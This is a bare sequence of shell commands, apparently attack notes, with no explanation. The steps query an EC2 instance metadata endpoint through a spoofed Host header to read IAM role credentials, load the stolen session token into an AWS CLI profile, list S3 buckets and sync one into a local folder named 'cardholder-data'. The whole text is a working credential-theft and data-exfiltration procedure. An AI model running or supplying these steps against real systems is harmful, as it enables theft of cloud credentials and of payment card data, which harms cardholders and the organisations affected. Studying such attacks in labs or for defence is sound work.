`curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'`

​
`curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'`

​
`aws configure --profile erratic`

​
`aws_session_token = <session-token>`

​
`aws s3 ls --profile erratic`

​
`aws s3 sync s3://<bucket-name> ./cardholder-data --profile erratic`
